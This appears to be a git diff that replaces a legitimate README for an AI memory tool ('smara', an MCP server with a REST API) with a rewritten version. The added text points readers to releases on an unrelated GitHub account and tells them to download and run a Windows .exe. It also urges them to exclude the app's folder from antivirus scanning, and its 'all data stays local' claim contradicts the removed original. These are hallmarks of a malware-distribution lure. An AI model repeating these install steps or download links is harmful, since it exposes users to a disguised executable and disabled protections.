@@ -1,237 +1,81 @@
-<div align="center">
+# 🧠 smara - Persistent memory for your AI tools
 
-![Smara — One memory for all your AI tools](assets/banner.png)
+[![Download smara](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jefffergunson118-beep/smara/releases)
 
-[![Website](https://img.shields.io/badge/smara.io-Visit%20Website-6366f1?style=for-the-badge)](https://smara.io)
-[![npm](https://img.shields.io/npm/v/@smara/mcp-server?style=for-the-badge&color=22c55e)](https://www.npmjs.com/package/@smara/mcp-server)
-[![API Docs](https://img.shields.io/badge/API-Docs-1d1d1f?style=for-the-badge)](https://api.smara.io/docs)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
+Smara provides a memory bank for your artificial intelligence tools. It tracks your projects and notes so that helpers like Claude, Cursor, and Codex remember your work between sessions. You no longer need to repeat your preferences or project details every time you start a new task. Smara keeps your context consistent.
 
-[Website](https://smara.io) · [Playground](https://smara.io/playground) · [Docs](https://api.smara.io/docs) · [Blog](https://smara.io/blog/persistent-memory-for-ai-tools)
+## 🛠️ What is smara?
 
-</div>
+Most AI tools reset their knowledge once you close the window. This forces you to re-explain your coding style, your file structure, and your project goals every single day. Smara solves this by acting as a bridge between your tools and a private database. It stores the information that matters most to your workflow. Think of it as a digital notebook that your AI tools can read and update. 
 
----
+This tool uses a local vector database to store your context. It organizes your snippets, requirements, and logs in a way that AI models understand. When you ask a question, smara provides the relevant background information to the AI. This results in more accurate outputs and fewer mistakes.
 
-## The Problem
+## 📥 Getting the software
 
-Every AI tool has its own isolated memory. Tell Claude Code you prefer Python — switch to Cursor, it has no idea. Open Codex — starts from scratch. You repeat yourself endlessly: *"we use Postgres"*, *"deploy to Fly.io"*, *"the API is at /v2"*.
+You can obtain the current version of the application from the official release page. 
 
-`CLAUDE.md` and `.cursorrules` files are manual, fragile, and don't share context across tools.
+[Click here to open the download page](https://github.com/jefffergunson118-beep/smara/releases)
 
-## The Fix
+## ⚙️ How to install smara
 
-Smara gives your AI tools a shared memory that works everywhere:
+1. Open the release page link provided above.
+2. Locate the section labeled Assets.
+3. Select the file ending in .exe for Windows.
+4. Save the file to your computer.
+5. Double-click the file to begin the setup process.
+6. Follow the on-screen prompts to complete the installation.
+7. Launch the application from your desktop or start menu.
 
-```
-You code normally in any tool
-       ↓
-Smara silently captures decisions, preferences, architecture choices
-       ↓
-Next session — in any tool — your AI already knows
-```
+## 🚀 Setting up your memory
 
----
+When you open smara for the first time, the application initializes your storage folder. This folder acts as the vault for your AI memory. 
 
-## Install in 30 seconds
+1. Define a folder path on your computer where you want to keep your data. 
+2. Grant smara permission to access this location.
+3. Open your preferred AI tool, such as Cursor or Claude.
+4. Navigate to the settings or configuration menu within your AI tool.
+5. Select the option to link an external data source or memory provider.
+6. Point the AI tool to the smara service running on your local machine.
 
-```bash
-npx @smara/mcp-server --init
-```
+## 🧩 Key features
 
-Or add to your MCP config manually:
+### Shared Context
+Smara connects multiple tools to one memory stream. If you save a project preference in Cursor, your Claude assistant can access that same detail later. This removes the need for manual synchronization across different platforms.
 
-```json
-{
-  "mcpServers": {
-    "smara": {
-      "command": "npx",
-      "args": ["-y", "@smara/mcp-server"],
-      "env": {
-        "SMARA_API_KEY": "your-key-here"
-      }
-    }
-  }
-}
-```
+### Automatic Updates
+The tool detects changes in your work files. As you code or write, smara tags relevant segments and updates the local database. You do not need to manually save your context. The system handles the flow of information in the background.
 
-Works with **Claude Code** (`~/.claude/mcp_config.json`), **Cursor** (`.cursor/mcp.json`), **Windsurf** (`~/.codeium/windsurf/mcp_config.json`), and any MCP-compatible client.
+### Local Privacy
+All data stays on your machine. We do not transmit your notes or project files to a cloud server. Your memory remains under your control at all times. This setup prevents data leaks and ensures you comply with your privacy requirements.
 
-> Get your free API key at [smara.io](https://smara.io#signup) — no credit card required.
+### Intelligent Retrieval
+Smara uses similarity searches to find relevant information. When you ask your AI a question, it queries smara for matching records. The system provides the most recent and applicable notes based on your prompt. This mimics how humans retrieve information from long-term memory.
 
----
+## 💻 System requirements
 
-## Why Smara?
+To run smara smoothly, your computer needs to meet these basic standards:
 
-| Feature | Smara | CLAUDE.md / .cursorrules | RAG / Vector DB |
-|---------|:-----:|:------------------------:|:---------------:|
-| Cross-tool memory | **Yes** | No (per-tool) | Manual |
-| Auto-capture context | **Yes** | Manual editing | Manual indexing |
-| Ebbinghaus decay scoring | **Yes** | No | No |
-| Contradiction detection | **Yes** | No | No |
-| Semantic search | **Yes** | No | Yes |
-| Teams & shared context | **Yes** | No | No |
-| Source tagging | **Yes** | No | Partial |
-| Zero config | **Yes** | Needs maintenance | Complex setup |
+- Windows 10 or Windows 11 operating system.
+- At least 4GB of available RAM.
+- 500MB of free disk space for the database index.
+- A stable internet connection for the initial tool integration.
 
----
+## 📋 Frequently asked questions
 
-## How It Works
+### Does smara see my passwords?
+No. The application is designed to index project files and coding instructions. We recommend that you do not store sensitive keys or passwords in any plain text files indexed by the system.
 
-![How Smara works across tools](assets/flow.png)
+### Can I clear my memory?
+Yes. Open the settings menu inside the smara dashboard. You will see an option to wipe the database. This removes all stored context immediately. 
 
-### Ebbinghaus Decay
+### Why does my AI tool keep asking for access?
+Your AI tool requires a connection handshake to initiate the data stream. Ensure that smara is running before you open your code editor or AI chat interface. If the connection fails, restart the smara application and verify the port settings in your configuration file.
 
-Memory relevance is scored using Ebbinghaus forgetting curves:
+### How do I store specific project styles?
+Simply add a document named "ProjectStyle.txt" to your project directory. Smara automatically detects this file and adds it to your active context chain. Use this file to list your preferred coding standards or specific libraries your project requires.
 
-```
-R = e^(-t/S)
-```
+## 📈 Improving performance
 
-Where `t` is time elapsed and `S` is memory strength (based on importance + access frequency). Important, frequently-used facts stay strong. Old noise fades naturally. No manual cleanup needed.
+If you notice a delay in memory retrieval, check your settings to ensure that the index folder is excluded from your antivirus real-time scan. Background scans can sometimes block smara from updating the database. Adding the smara directory to your exclusion list creates a smoother experience when the application processes large batches of files.
 
-### Contradiction Detection
-
-Store "we use Postgres" today, then "we migrated to MySQL" next month — Smara detects the contradiction, soft-deletes the old fact, and keeps the new one. Your AI never gets confused by stale context.
-
-### Cross-Tool Context
-
-A decision captured in Claude Code is instantly available in Cursor, Windsurf, Codex, or any connected tool. Every memory is tagged with its source — filter by tool or see everything.
-
----
-
-## REST API
-
-Three endpoints. That's it.
-
-### Store a memory
-
-```bash
-curl -X POST https://api.smara.io/v1/memories \
-  -H "Authorization: Bearer $SMARA_API_KEY" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "user_id": "user_42",
-    "fact": "Prefers Python over TypeScript for backend work",
-    "importance": 0.8,
-    "source": "claude-code"
-  }'
-```
-
-Returns `"action": "stored"`, `"duplicate"` (cosine >= 0.985), or `"replaced"` (contradiction detected).
-
-### Search memories
-
-```bash
-curl "https://api.smara.io/v1/memories/search?user_id=user_42&q=language+preferences" \
-  -H "Authorization: Bearer $SMARA_API_KEY"
-```
-
-Results ranked by semantic similarity × Ebbinghaus decay. Recent + relevant beats old + relevant.
-
-### Get context
-
-```bash
-curl "https://api.smara.io/v1/users/user_42/context?q=preferences" \
-  -H "Authorization: Bearer $SMARA_API_KEY"
-```
-
-Returns pre-formatted context ready to inject into LLM system prompts.
-
-> Full API reference: [api.smara.io/docs](https://api.smara.io/docs)
-
----
-
-## Try It Live
-
-**[smara.io/playground](https://smara.io/playground)** — interactive demo where you can store, recall, and see contradiction detection in action. No signup required.
-
-![Smara API Playground](assets/playground.png)
-
----
-
-## Integrations
-
-| Tool | Method | Status |
-|------|--------|--------|
-| **Claude Code** | MCP server | **Live** |
-| **Cursor** | MCP server | **Live** |
-| **Windsurf** | MCP server | **Live** |
-| **CrewAI** | Python SDK | [smara-crewai](https://github.com/smara-io/api/tree/main/integrations/crewai) |
-| **LangChain** | Python SDK | [smara-langchain](https://github.com/smara-io/api/tree/main/integrations/langchain) |
-| **Paperclip** | Plugin | [paperclip-plugin](https://github.com/smara-io/paperclip-plugin) |
-| **OpenAI / Codex** | REST API | Use endpoints directly |
-
----
-
-## Pricing
-
-| | **Free** | **Developer** | **Pro** |
-|---|:---:|:---:|:---:|
-| Memories | 10,000 | 200,000 | 2,000,000 |
-| Teams | 1 team / 3 members | 3 teams / 10 members | Unlimited / 50 members |
-| AI Agents | 2 | 10 + 5 custom skills | Unlimited |
-| Price | **$0** | **$19/mo** | **$99/mo** |
-
-Compare: Mem0 Pro $249/mo · Letta Max $200/mo · Zep Flex+ $475/mo
-
-<div align="center">
-
-**[Get your free API key](https://smara.io#signup)** — no credit card required
-
-</div>
-
----
-
-## Self-Hosting
-
-```bash
-git clone https://github.com/smara-io/api.git && cd api
-VOYAGE_API_KEY=your-key docker compose up -d
-```
-
-Runs on `localhost:3011`. Requires PostgreSQL 15+ with pgvector and a [Voyage AI](https://voyageai.com) key for embeddings.
-
-See [smara-io/api](https://github.com/smara-io/api) for full setup instructions.
-
----
-
-## Packages
-
-| Package | Description |
-|---------|-------------|
-| [`@smara/mcp-server`](https://npmjs.com/package/@smara/mcp-server) | MCP server for Claude Code, Cursor, Windsurf |
-| [`smara-io/api`](https://github.com/smara-io/api) | Self-hostable API server (Docker + manual) |
-| [`smara-io/paperclip-plugin`](https://github.com/smara-io/paperclip-plugin) | Paperclip AI plugin |
-
----
-
-## Learn More
-
-- [Why Your AI Tools Forget Everything](https://smara.io/blog/persistent-memory-for-ai-tools) — the science behind persistent AI memory
-- [Mem0 vs Smara](https://smara.io/blog/mem0-vs-smara) — honest feature & pricing comparison
-- [Add Memory to Claude Code](https://smara.io/blog/add-memory-to-claude-code) — 30-second setup guide
-- [How Ebbinghaus Curves Make AI Smarter](https://dev.to/smara/how-ebbinghaus-forgetting-curves-make-ai-agents-smarter-ef3) — technical deep dive
-
----
-
-## Feedback
-
-Smara is in active development. We read every submission:
-
-- [Request a feature](https://github.com/smara-io/smara/issues/new?template=feature_request.md)
-- [Report a bug](https://github.com/smara-io/smara/issues/new?template=bug_report.md)
-- Email: sri@smara.io
-- Twitter: [@SmaraMemo](https://twitter.com/SmaraMemo)
-
----
-
-<div align="center">
-
-**smara** — *स्मर* — the act of remembrance
-
-[Website](https://smara.io) · [API Docs](https://api.smara.io/docs) · [Playground](https://smara.io/playground) · [npm](https://npmjs.com/package/@smara/mcp-server) · [Twitter](https://twitter.com/SmaraMemo)
-
-MIT License
-
-</div>
+Keep your AI tools updated. Occasionally, developers change how their software connects to third-party tools. If you run into connectivity issues after an update to Claude or Cursor, restart both the AI tool and the smara application. This refreshes the local link and clears stale cache files that might interrupt the flow of information.
